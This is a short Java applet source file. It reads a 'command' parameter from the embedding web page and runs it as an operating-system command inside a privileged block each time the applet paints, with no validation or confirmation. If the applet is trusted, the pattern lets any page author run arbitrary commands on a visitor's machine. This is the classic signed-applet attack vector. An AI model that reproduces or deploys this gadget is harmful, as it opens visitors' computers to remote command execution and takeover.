import java.applet.*;
import java.lang.*;
import java.awt.*;
import java.security.*;
import java.io.*;

public class AppletRunner extends Applet {

	public void paint(Graphics g) {

	    String cmd = this.getParameter("command");
    	    launchScript(cmd);

	}
	public void launchScript(String cmd)
	{
	    try
	    {	
		System.out.println("Full command:  = " + cmd);
		if (cmd != null && !cmd.trim().equals(""))
		{
		   	final String tempcmd = cmd;
			AccessController.doPrivileged(new PrivilegedAction() {
				public Object run() {
					try
					{
					    Runtime.getRuntime().exec(tempcmd);
					}
					catch (Exception e)
					{
					    System.out.println("Caught exception in privileged block, Exception:" + e.toString());
					}
				return ""; // nothing to return
		    		}
			});                    
			System.out.println(cmd);
		}
		else
		{
		    System.out.println("execCmd parameter is null or empty");
		}
	    }
	    catch (Exception e)
	    {
		System.out.println("Error executing command --> " + cmd );
		System.out.println(e);
	    }
	}
}
